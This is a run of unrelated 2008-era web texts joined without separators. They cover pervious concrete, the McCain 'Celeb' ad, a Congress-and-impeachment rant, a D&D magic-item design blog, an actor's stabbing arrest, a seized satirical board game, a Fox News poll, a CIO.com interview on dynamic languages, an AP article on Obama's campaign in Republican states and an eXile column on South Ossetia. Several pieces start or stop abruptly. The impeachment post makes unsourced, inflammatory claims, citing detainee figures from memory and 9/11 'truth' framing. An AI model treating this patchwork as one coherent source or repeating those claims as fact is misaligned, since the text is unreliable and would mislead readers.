Run off from coal - tar sealed parking lots have been found to have 65 % more polycyclic aromatic hydrocarbons ( PAHs ) than unsealed lots .
PAHs are one of the most widespread organic pollutants and have been found to be probable human carcinogens .
PAHs have been long associated with causing lung cancer in roofers and asphalt workers according to the National Institute of Environmental Health Science .
Large concentrations of PAHs can also kill aquatic life .
I ’m not sure how true this is , but the vendors claim that when automobile fluids are washed down under parking lots that they are filtered out and transformed by microorganisims into inert materials before they reach aquifers .
If you are looking to build a pathway , drive way , or parking lots pervious concrete might just be the perfect alternative to traditional concrete .
Vendors are popping up all over the country and here in Phoenix Progressive Concrete Works is probably one of the best known .
They ’ve done some large installations such as ASU ’s Art Museum parking lot .
McCain : ' Celeb '
The McCain camp keeps bringing the mockery , and tries to use Obama 's celebrity status against him .
Celebrity is , indeed , a key axis of this campaign .
Both men are bona fide celebrities , but Obama 's wattage offers both an opportunity -- see the cover of People -- and a risk .
The question is whether he can keep finding ways ( notably , access ) to keep the celebrity press in the business of making people feel closer to him , in the Bonnie Fuller model , or whether he becomes -- as this ad portrayes him -- a distant , hard to identify with , figure .
ALSO : There 's a claim in the ad that Obama " will raise taxes on electricity , " which I 'm sure will be much hashed over today .
The McCain camp 's backup is Obama 's comment , this February , to a San Antonio paper that " what we ought to tax is dirty energy , like coal and , to a lesser extent , natural gas . "
He was responding to a question about taxing wind energy ; I have n't seen the plan to tax coal -- the main source of electricity in America -- anywhere in his formal plans , but he clearly did suggest it in that interview .
Polifact looked into this a bit , and has more .
So , why is impeachment " off the table ? "
Of course , it is not within my powers to read minds and hold a crystal ball .
Not being some kind of Merlyn or Wizard of Oz , all I can do is speculate .
But based on a few facts , I think there is ample evidence to conclude that Congress fears not turning off their constituents with the " waste of time " argument by doing a negative show where impeachment is concerned .
Neither are they , I believe , lying down or " caving " in to Bush 's fear mongering .
Instead , I believe they are protecting themselves .
If they impeached either Bush or Cheney , so much would come to light about Congress ' own complicity in Bush and Cheney 's crime rings , that they would be impeaching themselves along with the two murderers holding nuclear weapons in their hands .
Having posted this a million times before , let me apologize right now for the eyeball - rolling repetition .
Those of you who have read what I have posted about the Congressional voting record , may sign off here right now , keeping in mind what I have stated above .
But before you do sign off , let me suggest that it would be terribly important to have a communal brainstorm :
How do we get around the problem of impeachment being " off the table " based on Congress ' attempts to protect their seats in office , and not to earn themselves a seat in jail ?
I doubt that they are protecting Bush and Cheney , who are disgraces to the Republican and Democratic parties alike .
Far from it .
Instead , they are self - concerned .
And until we can find a way to break through , impeachment is never going to happen .
Period .
What do you , dear readers , think is the solution ?
You can verify all the facts below on the ACLU "s website , the Center for Constitutional Rights , and the Electronic Frontier Foundation , by punching in the names of each bill into their search boxes : www.aclu.org www.ccrjustice.com www.eff.org
It was the former Republican majority which passed the Military Commissions Act ( MCA , or torture bill ) by nearly unanimous vote .
This bill allows for the euphemistic term " torture " of detainees and their confessions squealed up under pain levels " equivalent to severe organ failure or death " , such as invoked by a " hand slap " done with steel cables three inches thick .
This false evidence , squealed up by mostly completely innocent detainees , is permissible as " evidence " in the MCA .
Habeas corpus is nixed , meaning that the detainees have no right to challenge the grounds for their detention ( thus assuring the secrecy of the crime ring , in which mostly innocent people are captured and tortured as so - called " terrorists " ) .
And worse still , it grants the Prez , and future Prez's , immunity from prosecution as a war criminal for invoking this kind of cruel and unusual punishment for the crime of not being a terrorist at all , in most cases .
To boot , a mere photo in the newspapers would seem to be enough " evidence " to convince a world full of people that a " terrorist ringleader " has been caught .
All this in absence of court trials ... and we automatically believe everything we hear and read !
Please pass word on :
It ain't right , to say the least , to consider a mere newspaper photograph as ample " proof " that the Government has caught a " terrorist " .
In fact , the ACLU states in its movie Stop the Abuse of Power , that out of 850 Guantanamo detainees , only twelve of them ( in the best of my memory ) are guilty .
The Red Cross estimates that more than 75 % of " terrorist " detainees are innocent , and Amnesty International is vociferous .
Check out the Center for Constitutional Rights 's website about this , too .
So .... why the " revelation " and " Surprise " and " horror " to " find out " that Bush presided over individual torture cases all along , and that he " approved " ?
Repeat : CONGRESS voted for this .
IE it was n't just Bush who is The Problem Acting Alone .
It was the Republicans , by nearly solid unanimity who voted for the MCA .
Democrats just as solidly voted against it .
Is the " Surprise " and the ensuing " investigations " of Bush 's torturing a big pretense ?
Methinks the answer is " yes " , as may be obvious by now .
If Dems voted against the MCA , are they innocent and not guilty ?
Far from it .
The unconstitutional Patriot Act works hand - and - glove with the MCA .
It may be subtle , but on close analysis one comes to realize that the Patriot Act is actually quite instrumental in capturing innocent " Terrorists " :
a) Defines " terrorists " to include activists .
The Center for Constitutional Rights is vociferous about this , stating that the definition of terrorists in the PA " Could be misconstrued " to crack down on " First amendment rights " , ie , free speech .
Thus , vocal individuals would be vulnerable to targeting as " Terrorists " .
Witness : 911 truth activists called " Terrorists " by the Administration .
After all , the rationale is this :
If you expose the truth about 911 , you are siding with terrorists , ie committing treason .
That 's a twisted rationale which , in fact , is more likely a stunningly accurate projection of the Government 's own dynamic .
What we reject in ourselves , we see in the world around us .
Such would seem to be the case , where our Government is concerned .
b ) Grants expanded wiretapping powers without warrant .
Thus , the PA side - steps the power of the judiciary as a fundamental arm of government , with the function of putting a " check " on government power .
The implications of this unchecked power is scary .

This is part of my RPG series of entries here at SOB .
See the inaugural entry in the series for more details .
I tend to prefer a somewhat lower - than - average magic level for a fantasy RPG world .
To my preferences , magic should be special — and as such , it needs to be rare , or at least should n’t be commonplace .
The way most D&D games go ( and , I would assume , the way most Pathfinder games will go ) , magic items are just ways to improve a character ’s ability to level up faster .
The typical treasure - churn of traditional D&D games , where characters pick up a better magical sword and throw away ( or sell ) the old sword because its bonus is one lower than the new one , just strikes me as sad and silly .
The Necessity of Magic :
On the other hand , the game is designed with magic items in mind .
It ’s expected that characters will have magic items to enhance their capabilities in encounters .
There ’s even a general estimate chart for determining how many GPs ’ worth of wealth a character should have at a given level in the DMG — presumably , mostly split up between money and magic items ( though some of that money might be converted into land holdings , et cetera ) .
To simply cut most magic items out of the game — especially if you do n’t want to “ compensate ” the PCs by dumping a deluge of gold coins on them — pretty much just screws them over if you do n’t completely rework the rest of the way the game plays out .
I ’ve tended to be pretty good at adjusting the power levels of things in my games to balance them out in the past , but I ’m not entirely used to the sheer frightening nuclear weapon yield power of certain spellcasting classes in 3E .
I ’m having a little bit of difficulty balancing this stuff out — there ’s a sorcerer in my game that has quickly developed a reputation for being able to lay down the law in standard combat encounters upon reaching a level where he can cast lightning bolt and fly spells .
During a jailbreak , he turned a hallway full of lower - level guardsmen into crispy critters in pretty short order .
Now , of course I can ( and do ) skew things in a manner that ensures the other characters ’ talents get a chance to come into play , but that does n’t change the fact that there ’s an obvious power imbalance if the other PCs lack magic of their own in the form of high - power gear .
It ’s a difficult balancing act , trying to keep the game from turning into a constant treasure - churn without throwing off the comparative power levels .
In Search of a Solution :
Something I ’ve had percolating in the back of my head for months now is the desire for a way to give characters the power they need from magic items without necessitating a treasure churn process .
A number of different approaches to this have occurred to me , including a heuristic sort of means of translating magic items they would have gotten into special abilities intrinsic to the characters , some straight per-level bonuses ( such as a Base Defense Bonus to balance out the Base Attack Bonus increases ) , and modifiable magic items .
I also considered the Weapons of Legacy approach — but designed such that they do n’t destroy the intrinsic capabilities of the characters themselves in the process ( since that seems to be a significant problem with the rules in the Weapons of Legacy book ) .
I ultimately discarded it because of the fact that it does n’t really solve the whole problem , but only mitigates it a little .
Not everything can be a Weapon of Legacy without both making the game a bit duller and significantly damaging suspension of disbelief in the “ specialness ” of the things .
What I really need is a way to give characters the benefits of magic items , perhaps with actual magic items , but let those benefits grow with the characters rather than having to be periodically replaced because you ’ve outgrown that Sword of Magnificent Power you acquired eight levels ago .
More than that , it has to do so without taking an idea that would work great as an extreme rarity and turning it into a commonplace commodity .
It also has to be entirely believable within the context of the game , and has to be believable for every adventuring party in a campaign world I run .
As of tonight , I ’ve come to think that characters should perhaps acquire some kind of resources , in an out of character metagame sense , that can be translated into the same sort of benefits you get out of the magic item treasure churn .
I ’m considering two different approaches to the idea .
Two Approaches
In both of these approaches , the idea is n’t so much that characters ’ weapons just spontaneously power up at semi-regular intervals as that they become more invested in their favorite pieces of gear and thus forge some kind of connection with them that grants greater capabilities through their use .
As an alternative interpretation , I might completely change the very concept of ( permanent , non-consumed ) magic items , such that they are not specific , static repositories of easily defined power ; instead , each has a sort of character or essence unique to it , and as a character becomes increasingly attuned to it , he or she begins being able to manifest greater power through the use of the item .
Experience Equals Gold :
The first approach was inspired by the notion of that chart in the 3.5 DMG that gives guidelines for how much wealth a character should have at each level .
At first , my idea was to just give the PCs some fraction — perhaps half — of the wealth the guidelines suggest , and let them spend the rest on bonuses and special abilities for their gear .
Ultimately , however , I decided that introducing yet another number to the game , and having to figure out where to draw the line between money and magic , might be a touch problematic .
I ’d much rather use experience advancement as a guideline .
Looking at the “ Fast ” character advancement column in the Pathfinder RPG Beta , I see that the experience totals are almost exactly three times the wealth values in that DMG chart .
Okay , so dividing that number by three — or multiplying the value of all magic item bonuses and special abilities by three — seems a little broken .
It ’s the start of an idea , but it ’s going to have to get some wrinkles ironed out .
Feats For Magic Items :
The second approach that occurred to me tonight involves giving PCs more feats , and letting players spend some on special abilities for magic items .
For instance , with Pathfinder RPG ’s feat gains at every odd - numbered level , I would just fill in the even numbered levels with feat gains as well and let players spend feats on powers for magic items .
Some would be prerequisites for others , most likely , and there might be some limit on how many feats you can spend on a single item .
There might also be some powers that require more than one feat slot to acquire .
A variation on this might involve giving characters magic item power points at even levels that are distinct from feats , so that there ’s no overlap between feats and magic item improvements .
Whether this would ultimately make the job of defining the magic item advancement system easier or more difficult is open to debate , I think .
Wrapping Up :
I guess this will bear some further thought .
I ’m open to suggestions , and interested in discussion , if you have some to offer .
I ’m sure I ’ll settle on something eventually .
Maybe I ’ll playtest an idea somewhere along the way , mostly playing it by ear , and see how it works out .
If and when I have a complete system worked out , I ’m sure I ’ll make it publicly availalbe — probably right here at SOB .
44 year - old actor Shelley Malil is best known for his bit part as one of Steve Carrel ’s co-workers in the movie The 40 Year - Old Virgin .
He was also on those Budweiser commercials as one of the “ What are you doing ? ” guys and gets a lot of small parts in films playing Indian characters .
Malil was arrested and taken into custody yesterday for allegedly stabbing his ex girlfriend over 20 times in her home in San Marcos , CA .
He is said to have found another man at her house in the backyard , and her two children were thought to be home at the time .
The victim is in critical condition in the hospital .
I ’m not going to include the description of what happened to the victim .
There are some disturbing details of the woman ’s injuries that made me feel sick .
If you want to read that part , it ’s at the source , but warning on that link if you read the whole story .
The San Diego County Sheriff ’s Department said Shelley Malil , a resident of Sherman Oaks , was taken into custody at the Oceanside Amtrak station in connection with the attack around 6 p.m .
The sheriff ’s department said the stabbing took place on Sunday just before 9 p.m. in the 1800 block of Shade Tree Drive in San Marcos .
Officials said the attacker arrived at the his ex-girlfriend ’s home and found her in the back yard with a man .
Detectives said he grabbed a knife and began stabbing her repeatedly and then chased the victim through her home .
Her male companion was also stabbed in the hand when he tried to intervene , authorities said .
A woman who lives nearby told NBC 7/39 she heard the victim screaming and that the attacker stabbed the woman as many as 20 times .
The neighbor also said the victim was a mother with two children who were home at the time of the attack .
[ NBC SanDiego via TMZ ]
This was n’t a superficial knife wound , this woman could have easily been killed and it sounds like it ’s still touch and go for her .
Our thoughts are with the victim for a full recovery and if this guy did this he needs to be put away for a long time .
Police in Kent , UK arrested some climate protestors and confiscated their " criminal " equipment , including a satirical boardgame about the war on terror .
The police claim that the ski mask that came with the game could be used in a criminal act .
" Surely no member of the public is going to believe that a board game could be used as a weapon ? "
War on Terror , similar to games like Risk , revolves around creating empires that compete and wage war .
But there is a twist – players can poke fun at the rhetoric of world leaders like George Bush and Tony Blair …
In their cardboard version of realpolitik George Bush 's " Axis of Evil " is reduced to a spinner in the middle of the board , which determines which player is designated a terrorist state .
That person then has to wear a balaclava ( included in the box set ) with the word " Evil " stitched on to it .

From a Fox News Poll :
Who is Usama Rooting For ?
Who does Usama bin Laden want to be the next president ?
More people think the terrorist leader wants Obama to win ( 30 percent ) than think he wants Clinton ( 22 percent ) or McCain ( 10 percent ) .
Another 18 percent says it does n’t matter to bin Laden and 20 percent are unsure
Yes , that ’s right , Fox News is basically conducting push polling for the RNC by asking potential voters who they think Osama Bin Laden would vote for .
And guess who won !
Your man of questionable ‘ madrasa ’ background and middle names , Barack Hussein Osama !
Remember Kids Barack Obama would talk with the enemies of our military - industrial complex !
And you know what that means : he ’s complacent against terrorism .

The former second - class citizens of the programming world have leaped to the fore , changing the face of enterprise software development .
With the rise of Web 2.0 , scripting languages ( also called dynamic languages ) are now often considered important tools in a developer 's arsenal .
That 's a far cry from than their old reputation as lesser tools for those who can't handle " real " programming .
Dynamic languages are certainly popular .
Almost 70 percent of the 1,200 developers surveyed by Evans Data for its most recent Global Development Survey currently use JavaScript , the most popular dynamic language , with fifteen percent more planning to adopt it .
PHP is used by just over a third of developers , and Perl has captured about a quarter of developers ( though Perl is much more popular in North America , with 36 percent spending at least some of their time using it ) .
However , like any other tool , dynamic languages are not necessarily interchangeable .
Each has its place in a programmer 's toolkit .
We asked a group of luminaries in the scripting world for their perspectives on the current state of the scripting universe , and how it has changed since we last looked at the scripting language scene in 2005 .
Norris Boyd is the creator and maintainer of Mozilla Rhino , a JavaScript implementation for Java .
Boyd was part of the JavaScript team at Netscape .
Today , he is an engineering manager at Google .
Richard Dice is the president of the Perl Foundation , the organization which has responsibility for Perl 's legal , organizational , technical and administrative infrastructure .
Jeff Hobbs is director of languages and Tcl tech lead at ActiveState Software and a member of the Tcl core team .
Steve Holden is chairman of the Python Software Foundation , and author of Python Web Programming .
John Lam leads the IronRuby team at Microsoft .
Rohan Pall , representing PHP , is a consultant who has been programming Web applications for almost a decade .
CIO.com :
What place do scripting languages have in today 's computing environment ?
Boyd :
The biggest change since 2005 has been the growth of richer Web applications that perform more of their computations in the browser using JavaScript .
The demand for these applications has forced developers to learn and use JavaScript much more than before .
There 's also been a lot of interest in Ruby , another dynamic language , spurred by the release and growth of Ruby on Rails .
As a result of these changes , many developers are becoming more comfortable with dynamic languages .
Dice : Since 2005 , there have n't been any singular events that changed the way scripting languages are used or their capabilities .
They have evolved ( more in perception than in real capability ) from a place where they were used only for simple tasks or prototyping of new systems into much more general use .
The general upward slope in their acceptance and capabilities in that time , though , means that CIOs definitely need to put them on their radar and develop " scripting language awareness . "
In late 2007 , Forrester Research published its Forrester Dynamic Language Wave survey , so research on the topic is out there to work with .
Hobbs : Scripting languages are increasingly prevalent in Web applications , with PHP 's growing popularity and the rise of Ruby on Rails , while maintaining their dominance in important daily tasks such as machine and test automation with Tcl and data manipulation with Perl .
Python is finding increasing use in the scientific communities .
Holden : Scripting languages are being used in a wide range of application areas .
Python has recently achieved increased visibility in many areas of science and engineering , particularly in bioinformatics .
Three significant Web frameworks ( Django , TurboGears and Pylons ) have reached maturity in the last three years .
Scripting languages have a place anywhere that a systems programming language ( e.g. , implementing an operating system ) is not required .
Otherwise they fit basically anywhere , whether it be on the server or the desktop .
Python excels in all these areas !
Lam :
In general , it 's easier to create and change code written in a dynamic language .
Much of the Web has traditionally been created using dynamic languages , from Ajax on the client to server code written in PHP , Perl , Python and Ruby .
Ruby on Rails in particular has driven a lot of interest towards Ruby , and is one of the preferred platforms to build Web 2.0 startups on .
Pall :
In the last three years , we 've seen the adoption of very fast CPUs , namely the Intel Core 2 line .
Breaking the 3GHz barrier on this architecture — and now pushing 4GHz — has sped up dynamic language code to the point where many algorithms that simply were n't feasible to implement in PHP are now possible on commodity hardware .
In the last year , I 've participated in writing text analysis software for auto - classifying documents .
Our initial plan was to use C to do the heavy processing and PHP for the rest .
As it turned out , on midrange commodity hardware , we were able to use PHP throughout and maintain solid performance .
Web applications are commonly scripted , but in my experience , even internal processing - intensive applications are now commonly being implemented in modern , dynamic , scripting programming languages .
The bulwarks have been breached and progress is now ushered in .
Next :
How have attitudes changed towards dynamic languages ?
CIO.com :
What changes are you seeing in attitudes towards scripting ( dynamic ) languages ?
Boyd :
The increased use of JavaScript for browser - based applications is sparking interest in JavaScript as a language for use outside the browser .
I work on Mozilla Rhino , which is a JavaScript environment for Java , and we have seen a lot of people using Rhino on the server side to add scripting to their applications .
It 's a nice extension language for applications since it was designed from the start to run inside another application .
Dice : I 'm noticing changing attitudes from several angles .
As I mentioned before , Forrester Research released a Wave survey paper last year regarding dynamic languages .
This was motivated by their noticing that their customers were using more dynamic languages and requesting information on the competitive landscape in the field of dynamic languages .
Tools companies , including Eclipse and ActiveState , are offering more and better products for working with dynamic languages .
A segment of Java programmers seem to be embracing Ruby ( and Rails ) in particular .
A new dynamic language , Groovy , is capitalizing on this trend by providing a dynamic language on the Java Virtual Machine ( JVM ) that incorporates elements of both Java and Ruby .
Support for independent software vendors ( ISVs ) with dynamic languages is also improving .
The Linux Foundation 's recently - released LSB 3.2 spec includes Perl and Python as first - class supported languages within the spec , so ISVs who target this spec for their software can depend on Perl and Python being present in regularized configurations .
Hobbs :
The dynamic languages are becoming more accepted .
This is in part through more acceptance of open - source software , which all the dominant dynamic languages are ( versus Java and .
Net , which are questionably open in their process and / or sources ) .
It is also due to good frameworks being developed using newer languages such as Ruby on Rails .
You also see larger organizations fostering support for the languages , such as Google 's support of Python , which was made their primary development language for Google App Engine .
Holden : People seem more positive towards scripting languages .
They have , over time , come to realize that their performance is such that they work for most problems and have also learned that the compilation step can be heavy - handed and a huge time sink in the development cycle .
There is now a more general appreciation of the advantages of dynamic languages , whose characteristics are well - suited to Agile test - driven development techniques that have also become more popular in the same time frame .
The last three years have seen increased uptake in dynamic languages in many application areas .
For Python in particular , the IronPython ( now a Microsoft open - source project ) and Jython ( whose primary developer was recently hired by Sun Microsystems ) implementations have had a positive impact .
Lam : Compilation is orthogonal to static / dynamic .
IronRuby is a compiled language ( and an interpreted one too — we offer both options ) , yet it is clearly a dynamic language .
So it 's better to say that there are changes in attitude between static versus dynamic languages .
There is a " polyglot programmer " meme going around which roughly says that future systems will be built on a statically typed library foundation ( e.g. BCL in .
Net ) with a dynamically typed language used in a dual role to both script those static types as well as define a domain - specific language ( DSL ) which will be used to implement the high level app logic .
Pall :
For a large number of applications , when deciding what technology to use , it is no longer the case that the debate centers around dynamic languages versus compiled languages .
Scripting is now considered real programming , and indeed most people do n't even use the word " scripting " when describing what they do , but instead call it " programming . "
These days , it boils down to which dynamic programming language to use , not if you should use one .
Next : Has Ajax made a difference ?
CIO.com :
What effect has the growing prevalence of Ajax had on the adoption of the various languages ?
Are people adapting the techniques to languages other than JavaScript ?
Boyd :
Other than a greater comfort with dynamic languages , I do n't know of specific impacts of Ajax on other languages .
The techniques of Ajax are really only applicable inside the browser .
Dice : Ajax is entirely a JavaScript phenomenon — it stands for " Asynchronous JavaScript and XML . "
It is not so much a technology itself as a way of combining several existing technologies ( CSS , XHTML , XML , DHTML and JavaScript , and the various document object models ( DOMs ) available within modern Web browsers ) .
Taking these technologies together and calling them Ajax , Web applications can be made much more usable , visually appealing and functionally rich than previous Web application development paradigms afforded .
The first scripting language to benefit from Ajax in a big way was Ruby , though this was much more an accident than anything else .
A Ruby Web rapid application development framework called Ruby on Rails started gaining attention in 2005 .
It had three things in its favor : it was based on the Ruby language ( which a lot of people find quite nice to program with ) , developers found it to be a significant boost to productivity , and it was the first framework to integrate with any Ajax library .
So it quickly became identified with Ajax and vice versa .
Nowadays , every major scripting language has decent integration with every major Ajax library .
Most Ajax usage in Web applications development involves interaction with the server - side of the Web application .
The front end of the application — the end that lives on the Web browser — is HTML , Javascript , Ajax , etc .
The front end interacts with ( and most often is dynamically created by ) the back - end , which can be programmed in Perl , Python , Ruby ( or Java , C++ , Smalltalk , Lisp , etc. ) .
Hobbs : JavaScript is just the front - end language , often with a dynamic language on the back - end .
These are commonly Python , PHP or Ruby ( Rails ) , as they have become popular through common Web frameworks .
Dynamic languages are common because they are much easier to use than Java or .
Net on the background , providing as much as 10 x more developer productivity .
You can always throw more hardware at a problem , but getting something solid out on time is key , and dynamic languages provide great leverage to succeed .
Holden : Since Ajax is simply asynchronous network calls , it is not affecting the adoption of any specific language beyond more JavaScript usage in webpages .
The technique of Ajax is in no way new and has been available for decades , including in Python .
In the Python world , the TurboGears framework in particular accommodates support for several well - known Ajax toolkits , but the emergence of Ajax is essentially orthogonal to the language used for Web development , and is as likely to be used in the ASP .
Net environment as by Python users .
Lam : Ajax is popular because browsers are popular .
JavaScript 's popularity is directly tied to the fact that it 's deployed on virtually all browsers today .
Right now , there really are n't any other dynamic languages for the browser that are widely deployed , so nobody 's really trying .
I coined the term ARAX to try and drive some thinking around using Ruby in the browser as an alternative language to JavaScript .
That generated some interest in the Rails community since they would be interested in running some of their Ruby code in the browser .
Pall : Ajax is a very specific technology that allows webpages to rise above mediocre user - interfaces and become true applications using JavaScript .

Obama makes bid in 7 longtime Republican states Associated Press
Published : Monday August 4 , 2008
Print This Email This Alaska is young .
Georgia , North Carolina and Virginia have growing populations and many black voters .
Montana has seen recent Democratic inroads , and North Dakota has sent only Democrats to Congress since 1986 .
Indiana borders Barack Obama 's home state .
The Democratic presidential candidate is putting money and manpower in all seven of these states - at levels unmatched by Republican rival John McCain .
For decades , these states have almost exclusively voted for Republican presidential candidates and have rarely seen any campaign action .
Now , thanks in part to demographic and political shifts , they are emerging as new battlegrounds .
" We have the organizational ability and the financial ability to compete there , " Obama campaign manager David Plouffe said recently .
" There is not a head fake among them . "
Undeterred , senior McCain strategist Steve Schmidt said : " We feel very confident about holding these states . "
He also expressed optimism that McCain can win several Democratic - leaning perennial swing targets .
In the seven historically GOP bastions , Obama has run five weeks ' worth of TV ads and dispatched dozens of workers to sign up legions of unregistered voters that his campaign believes can be persuaded to support the Illinois senator in droves if courted aggressively .
Among their targets are blacks and young people , two constituencies that favor Obama but historically have been unreliable voters .
McCain is largely absent from most of these states , trusting for now that right - leaning roots will prevail .
Unlike McCain , Obama had a presence in all seven during the protracted Democratic primaries and that could benefit him .
But Republicans - and even some skeptical Democrats - claim Obama simply is trying to lure McCain into spending money defending GOP turf so he has less to compete with elsewhere .
Indeed , cash flow is a major factor ; Obama expects to be able to afford to compete most anywhere while McCain must be more careful with his money because he is accepting public financing and the spending limits that come with it .
Democrats see other dynamics in the states as opportunities , which Republicans say are just delusions .
Of the cluster , Virginia is most likely to go Democratic , so it 's the one where McCain is competing in earnest .
Obama is advertising statewide and has opened several offices .
Putting Virginia Gov. Tim Kaine on the ticket could help .
McCain 's headquarters is in northern Virginia , and he has a full paid Virginia campaign staff .
So far , he 's only on the air in the Washington , D.C. , media market that serves the burgeoning Virginia suburbs .
That 's the moderate region that has helped Democrats retain the governor 's office and pick up one Senate seat .
Democrats say the growing numbers of young left - leaning professionals in the north and the state 's large percentage of blacks - one in five - as well as untapped pools of potential voters make Virginia a ripe target for them .
More than 4 million people are eligible to vote , but roughly a third are not registered , including a half - million blacks and several hundred thousand people age 18 - 24 .
The situation is similar in two other fast - growing Southern states .
North Carolina has seen an influx of Northern retirees settling along the coast and in the mountains , while upper- class and academic transplants from all over flock to the booming economies of the high - tech Research Triangle and the Charlotte banking hub .
" You 're definitely getting a new mix , " said Bill Peaslee , a former state GOP chief of staff .
" Some of the old givens are no longer true .
It 's not how it was 20 years ago or even 10 years ago . "
Voter registrations are up , blacks are signing up in record numbers and a Democrat leads the state .
Recognizing a potential problem , McCain is sending a full paid staff to North Carolina though running no ads for now .
Georgia saw GOP gains in recent decades as conservatives moved in during a population spurt .
It now has a Republican governor and legislature , and a strong state party organization .
Even so , Democrats see an opening among blacks who now make up 30 percent of Georgia 's population .
Even Republicans predict the first black major party presidential nominee will produce the largest black turnout ever .
Obama also is optimistic because the Libertarian Party candidate , former Republican Rep. Bob Barr , is from Georgia and could draw off conservative votes there .
In Indiana , Obama could benefit from his ties to the populous , heavily black northwest corner that 's within Chicago 's media market .
He 's also counting on backers in liberal - leaning university towns like South Bend and Bloomington .
Choosing Indiana Sen .
Evan Bayh , a popular two - term governor , as his running mate would give Obama a boost .
" It ca n't be understated that he is from our neighboring state , " said Dan Parker , the state Democratic Party chairman .
Since 1936 , Democrats have won Indiana once in presidential elections , 1964 .
Still , they have had some success on the state level and ousted three GOP incumbent congressmen in 2006 .
Working - class Indiana whites pose hurdles for Obama as they did in his narrow primary loss to Hillary Rodham Clinton .
Along the U.S. - Canada border , Democratic statewide victories have emboldened Obama to make plays for Montana and North Dakota .
Republicans argue Democrats who win in those states are moderate and Obama is not .
Obama 's campaign also is counting on residual goodwill from his primary wins in both .
In Montana , Bill Clinton showed it 's worth it for a Democrat to compete hard ; he narrowly won it in 1992 but narrowly lost it four years later .
President Bush , however , won by enormous margins in back - to - back elections .
Nevertheless , Democrats took the governor 's office back with Gov. Brian Schweitzer 's election in 2004 over a Republican , and booted a GOP senator facing corruption allegations two years later to take control of both Senate seats .
Democrats claim the electorate has become more moderate as new people settled in mountainous western Montana .
Republicans argue the GOP foundation is strong and note that Montana has sent a Republican to the House since 1994 .
North Dakota has a GOP governor but has had an all - Democratic congressional delegation for more than two decades .
Still , no Democratic presidential candidate has won the state in more than 30 years .
Obama has opened offices in North Dakota 's four largest cities and has visited twice since wrapping up the nomination .
" Barack Obama coming up here and competing here is going to force John McCain to make a choice , " said Jamie Selzler , the state party director .
" For everything that McCain does up here , that 's a little bit less that he can do in these big battleground states we always hear about . "
Even farther north in far - flung Alaska , it 's been three decades since a Democratic nominee won the state .
Republicans dominate the levers of power , but corruption has rocked the party , including the latest black eye : the indictment of Sen .
Ted Stevens this week .
All that turmoil emboldens Obama .
So does the fact that Alaska is home to the nation 's third - youngest population .
Voter registrations among Democrats are outpacing Republicans .
Said state Sen. Hollis French , an Anchorage Democrat : " There is a real sense of energy coming off that campaign that is completely lacking from the other side . "
FRESNO ( Independent Exile ) --
Ames tells me the eXile must now " be more sensitive to Russian interests " and I 've got to play along .
Tough job .
But like any Cold - War brat , I always kinda wanted to be a Russian agent of influence -- just like that all - American boy Hansen at the FBI , who turned traitor just because he was bored at his desk .
Browse Column
So I spun the globe a few times and came up with a war where , believe it or leave it , Russia actually comes off like the White Knight .
I 'm talking about South Ossetia .
I see your little eyes glazing over , so I better give you some idea where and what South Ossetia is .
Well , for starters , it 's just south of North Ossetia .
Does that help ?
Did n't think so .
OK , how about this : it 's in Northeast Georgia .
And I do n't mean Jimmy Carter peanut - farming country .
I mean the other Georgia , on the east shore of the Black Sea , just north of the Caucasus , where all us Caucasians came from , although we got sorta less hairy along the way , thank God .
The east shore of the Black Sea -- that 's where Jason went to get that Golden Fleece , only he ended up with Medea , one of those high - maintenance foreign girlfriends .
She ended up feeding Jason his own sons one night .
Moral of the story : those exotic war brides never work out , long term .
Other moral of the story : folks in this part of the world play rough .
The Caucasus may be the part of the world that 's hardest for Americans to understand , because over there every inch of land is marked off with its own language and basketweaving traditions .
We 're just the opposite , which is why it 's so hard for us to get .
In the US you can drive a thousand miles without seeing one thing different .
No matter how far you go , it 's the same Interstate landscape , like you 're in a stuck video game : crops , offramp , Denny's , Mickey D's , AM / PM Minimart , more crops , offramp .
You cheer up when you come across a car crash because at least it 's a little variety .
The Caucasus does n't have an Interstate .
If it did , you 'd pay a toll in blood every single mile .
The Caucasus is a crazy maze of mountain valleys , every damn one marked off as the property of one tribe or another .
Step across some imaginary line and you 're walking into a blood feud that 's been going since the last Ice Age .
This is feudin ' country that makes Appalachia look like Haight - Ashbury .
While the Soviets were in charge , the Caucasians put their feudin ' gear in storage .
Stalin was one babysitter you did n't act up with .
He came from this part of the world himself .
That 's where he got so tough .
In fact , as long as Comrade Stalin ( real name : Dzhugashvili ) was on top , every Caucasian tribe wanted to claim him .
The Ossetians said he was Ossetian , and the Georgians told everybody he was Georgian .
And when everybody decided Stalin was a bad guy , it reversed : the Georgians said he was nuthin ' but a bloodthirsty Ossetian .
When Georgia turned independent after the USSR dissolved , the locals changed their tune again .
Instead of going on about how Ossetians were totally different from Georgians , the Georgians went around yelling that Ossetia was an integral part of Georgia , with no reason to go thinking about seceding .
At the time Georgia was run by this crazy poet - fascist named Gam - sakhurdia , one of the first post - Communist rabid nationalists , and he kinda got all the non-ethnic Georgians a little paranoid with his Gruzya ( Georgia ) for the Gruzininy rant .
See , Georgia 's small enough already , but even so , there are at least three parts of it that may or may not be ethnically distinct , depending on who you ask and who 's got the gun at the moment .
Think of Georgia as a big mouth , opening to take a bite out of the Black Sea .
There are three teeth in this mouth that are sort of loose , like GULAG prisoners ' teeth used to get from the scurvy .
There 's Adzharia , the bottom front tooth ; Abkhazia , the top front tooth ; and there 's South Ossetia , back inland there like a top molar .
When this new Georgian president , Saakashvili , took power last year ( with a whole lotta help from the CIA and George Soros ) , he started some intensive dental surgery to make sure none of those loose ethnic teeth fell out .
First he went after Adzharia , that loose lower - front tooth .
He got lucky there , because Adzharia was ruled by some white - haired nut - case who was more interested in raising fighting dogs than government .
They liberated his kennels -- seriously , this fruitloop had about 200 pit bulls and Dogos Argentinos , those all - white monsters -- and voila , Adzharia was back in Georgia again .
Adzharia was pretty easy , because most of the locals saw themselves as ethnically Georgian , only they were nominally Muslim instead of nominally Orthodox Christian as most Georgians are .
Ossetians do n't think of themselves as ethnic Georgians .
The Ossetians have what you call " a glorious past , " and in their case it 's true .
The Ossetians are nothing but the stay - at - home remains of the Alanii .
If you know your late - Roman and Dark - Ages military history , that made you sit up and grab for your helmet .
The Alanii !
They really were glorious .
The Alanii were horse nomads who raided around the steppes east of the Black Sea .
They had a lot of cool nomad war tricks .
One I like is that they used Great Danes , who used to be called " Alanii Dogs , " to attack enemy horses .
The Alanii kicked ass until they encountered the Roman Empire pushing east .
The Romans beat them in 175 AD , and then incorporated them into the Imperial Army .
The Romans were smart that way : they did n't take it personally if you put up a good fight .
